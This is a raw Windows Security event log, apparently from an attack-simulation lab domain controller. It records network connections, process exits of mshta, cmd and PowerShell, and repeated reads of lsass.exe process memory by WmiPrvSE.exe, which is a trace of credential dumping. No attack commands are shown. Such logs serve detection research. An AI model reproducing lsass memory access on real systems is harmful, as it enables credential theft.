			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382465
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		852
	Application Name:	\device\harddiskvolume1\windows\system32\lsass.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		55159
	Destination Address:	::1
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382464
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2684
	Application Name:	\device\harddiskvolume1\windows\adws\microsoft.activedirectory.webservices.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		55159
	Destination Address:	::1
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382463
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2684
	Application Name:	\device\harddiskvolume1\windows\adws\microsoft.activedirectory.webservices.exe

Network Information:
	Source Address:		::
	Source Port:		55159
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382462
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55158
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382461
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55158
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:32 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382469
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59490
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382473
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61690
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382472
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59736
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382471
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55160
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382470
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55160
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382482
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x264
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382481
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0xcc4
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0xFFFFFFFF
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382480
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0xa98
	Process Name:	C:\Windows\System32\cmd.exe
	Exit Status:	0xFFFFFFFF
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382479
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1080
	Process Name:	C:\Windows\System32\mshta.exe
	Exit Status:	0xFFFFFFFF
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382478
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x26c
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382477
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x258
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382476
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x220
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382475
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E4

Process Information:
	New Process ID:		0x1ad4
	New Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x24c
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382474
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1744
	Process Name:	C:\Windows\System32\notepad.exe
	Exit Status:	0x0
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382497
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1d18
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382496
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1890
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0xFFFF0000
